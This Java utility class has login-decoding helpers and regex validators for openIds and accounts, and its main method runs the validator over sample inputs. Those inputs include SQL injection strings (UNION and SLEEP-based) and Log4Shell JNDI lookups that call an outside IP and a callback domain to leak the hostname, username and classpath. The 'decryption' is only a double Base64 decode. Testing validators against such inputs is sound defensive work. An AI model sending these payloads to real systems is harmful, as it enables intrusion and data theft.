package com.caring.sass.common.utils;


import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @className: LoginDecryption
 * @author: 杨帅
 * @date: 2024/4/25
 */
public class LoginDecryption {

    public static void main(String[] args) {
        String string = "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77QxH4qwcVo8sQWyCm-C4U3w\n" +
                "o8uR77QxH4qwcVo8sQWyCm-C4U3w\n" +
                "o8uR77QkHVyzR8BchqPOEx7dI5ws\n" +
                "o8uR77QkHVyzR8BchqPOEx7dI5ws\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "' union select 1-- \n" +
                "' union select 1,2-- \n" +
                "' union select md5(3141592657),2-- \n" +
                "' union select 1,md5(3141592657)-- \n" +
                "\" union select 1-- \n" +
                "\" union select 1,2-- \n" +
                "\" union select md5(3141592657),2-- \n" +
                "\" union select 1,md5(3141592657)-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co' union select 1-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co' union select 1,2-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co' union select md5(3141592657),2-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co' union select 1,md5(3141592657)-- \n" +
                "%bf%27%bf'%27%22'\"\\\\%5C%0d%0a%23#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "\" AND (SELECT*FROM(SELECT(SLEEP(4)))tmko) limit 1#\n" +
                "\")) OR (SELECT*FROM(SELECT(SLEEP(4)))iixh) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\") AND (SELECT*FROM(SELECT(SLEEP(4)))tmko) limit 1#\n" +
                "\") AND (SELECT*FROM(SELECT(SLEEP(2)))hskv) limit 1#\n" +
                "')) OR (SELECT*FROM(SELECT(SLEEP(3)))xeoz) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "\" OR (SELECT*FROM(SELECT(SLEEP(3)))dtby) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\")) OR (SELECT*FROM(SELECT(SLEEP(3)))dvsn) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co AND (SELECT*FROM(SELECT(SLEEP(3)))mamg) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\" OR (SELECT*FROM(SELECT(SLEEP(2)))wmxb) limit 1#\n" +
                "%bf%27%bf'%27%22'\"\\\\%5C%0d%0a%23#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co%bf%27%bf'%27%22'\"\\\\%5C%0d%0a%23#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "' AND (SELECT*FROM(SELECT(SLEEP(2)))icuu) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co') OR (SELECT*FROM(SELECT(SLEEP(4)))fgzn) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co') AND (SELECT*FROM(SELECT(SLEEP(4)))dmse) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co' AND (SELECT*FROM(SELECT(SLEEP(3)))scpp) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\" union select 1-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\" union select 1,2-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\" union select md5(3141592657),2-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\" union select 1,md5(3141592657)-- \n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co%bf%27%bf'%27%22'\"\\\\%5C%0d%0a%23#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "')) AND (SELECT*FROM(SELECT(SLEEP(2)))kyyk) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co')) AND (SELECT*FROM(SELECT(SLEEP(4)))jklk) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\" AND (SELECT*FROM(SELECT(SLEEP(4)))fjvm) limit 1#\n" +
                "\")) AND (SELECT*FROM(SELECT(SLEEP(2)))fyle) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\") OR (SELECT*FROM(SELECT(SLEEP(4)))mvbq) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\")) AND (SELECT*FROM(SELECT(SLEEP(4)))qnvx) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "\") OR (SELECT*FROM(SELECT(SLEEP(2)))pcmu) limit 1#\n" +
                "%bf%27%bf'%27%22'\"\\\\%5C%0d%0a%23#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "') OR (SELECT*FROM(SELECT(SLEEP(2)))imlk) limit 1#\n" +
                "') AND (SELECT*FROM(SELECT(SLEEP(3)))yiww) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co%bf%27%bf'%27%22'\"\\\\%5C%0d%0a%23#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co')) OR (SELECT*FROM(SELECT(SLEEP(3)))tmiz) limit 1#\n" +
                "' OR (SELECT*FROM(SELECT(SLEEP(2)))qdrv) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                " AND (SELECT*FROM(SELECT(SLEEP(4)))zclx) limit 1#\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co' OR (SELECT*FROM(SELECT(SLEEP(3)))nuqj) limit 1#\n" +
                "${jndi:rmi://183.47.120.213:1099/bypass6a58428439466cf9f41bb614c23f76ab-/-${hostName}}\n" +
                "${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.5c5919b406299eace3c83a7210e6cfe0.4j2.mauu.mauu.me/}\n" +
                "${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.c948cb9cd0e6948907c27fd66f504e0e.4j2.mauu.mauu.me/}\n" +
                "${jndi:ldap://183.47.120.213:1389/jdk18e212bfb0a23691a193c73ff6351e1b03-/-${hostName}}\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "aaaa'%bf%27\n" +
                "o8uR77clLmYFjImGyAKLn2DCk5co\n" +
                "o8uR77U442zNcZfPsGYOKYxMkzkU\n" +
                "o8uR77U442zNcZfPsGYOKYxMkzkU\n" +
                "o8uR77Vsn0tLMd3R7dshBLMnWxb8\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77QUdChxue7-92k7ppICkxMc\n" +
                "o8uR77TfolbeZ7OOGKhotf6ONHYY\n" +
                "o8uR77SupuiCb2W3LTU-Zjv8IZfo\n" +
                "o8uR77SupuiCb2W3LTU-Zjv8IZfo\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77RZynK9SERrdtP57X6WKbYQ\n" +
                "o8uR77Ww4f_Yj_kB1e8-XjA4MGf4\n" +
                "o8uR77bP4qZHGo0I2nXywFdnvh2k\n" +
                "o8uR77Ww4f_Yj_kB1e8-XjA4MGf4\n" +
                "o8uR77ZgvBBkUg-ptca6vg01Co14\n" +
                "o8uR77Ww4f_Yj_kB1e8-XjA4MGf4\n" +
                "o8uR77YFdVcMKWf-AJbHwAgzBdsA\n" +
                "o8uR77aiivd4PBgaz-gK8J5dUEis\n" +
                "o8uR77RZynK9SERrdtP57X6WKbYQ\n" +
                "o8uR77YFdVcMKWf-AJbHwAgzBdsA\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77YFdVcMKWf-AJbHwAgzBdsA\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77Wl4Uq0f2HI6-VUBLOOTg4c\n" +
                "o8uR77dY8Nkq_uIRNNVeTcN1V3PI\n" +
                "o8uR77aiivd4PBgaz-gK8J5dUEis\n" +
                "o8uR77edKhb68pmDeM7Ev0SZs5SU\n" +
                "o8uR77edKhb68pmDeM7Ev0SZs5SU\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77UL6QQonaqQpVd8Z7ddxYVQ\n" +
                "o8uR77bNneVS0nzRjHRHoPM7vT-A\n" +
                "o8uR77TM3ig2aHsS6EnsPVTCj3J8\n" +
                "o8uR77aXMbOIEGR9hoZPtD0x8hX4\n" +
                "o8uR77TM3ig2aHsS6EnsPVTCj3J8\n" +
                "o8uR77UL6QQonaqQpVd8Z7ddxYVQ\n" +
                "o8uR77bNneVS0nzRjHRHoPM7vT-A\n" +
                "o8uR77UL6QQonaqQpVd8Z7ddxYVQ\n" +
                "o8uR77V_R_F3erObQtzE3dkt0ZPE\n" +
                "o8uR77bNneVS0nzRjHRHoPM7vT-A\n" +
                "o8uR77UL6QQonaqQpVd8Z7ddxYVQ\n" +
                "o8uR77ezE0YKxzuJtX_0rpQIpgTA\n" +
                "hhhhhh\n" +
                "hhhhhh\n" +
                "o8uR77TM3ig2aHsS6EnsPVTCj3J8\n" +
                "o8uR77Ww4f_Yj_kB1e8-XjA4MGf4\n" +
                "o8uR77Ww4f_Yj_kB1e8-XjA4MGf4\n" +
                "o8uR77Ww4f_Yj_kB1e8-XjA4MGf4\n" +
                "o8uR77UL6QQonaqQpVd8Z7ddxYVQ";
        for (String s : string.split("\n")) {
            boolean openId = isValidOpenId(s);
            System.out.println(s + ":" + openId);
        }

    }

    /**
     * 解密前端登录提交的 账号 密码
     * @param str
     * @return
     */
    public static String loginDecryption(String str) {

        byte[] decode = Base64.getDecoder().decode(str);
        String decodedString = new String(decode);
        String substring = decodedString.substring(1, decodedString.length() - 1);
        byte[] decode1 = Base64.getDecoder().decode(substring);

        String decoded1String = new String(decode1);
        return decoded1String.substring(7);
    }



    public static boolean isValidOpenId(String account) {
        // 定义正则表达式，匹配不包含指定特殊字符的字符串
        String regex = "^[^<>&#$*(),']*$";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(account);
        return matcher.matches();
    }

    /**
     * 校验字符串中是否存在 < > & # $ * ( ) -
     * @param account
     * @return
     */
    public static boolean isValidAccount(String account) {
        // 定义正则表达式，匹配不包含指定特殊字符的字符串
        String regex = "^[^<>&#$*()-]*$";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(account);
        return matcher.matches();
    }

}
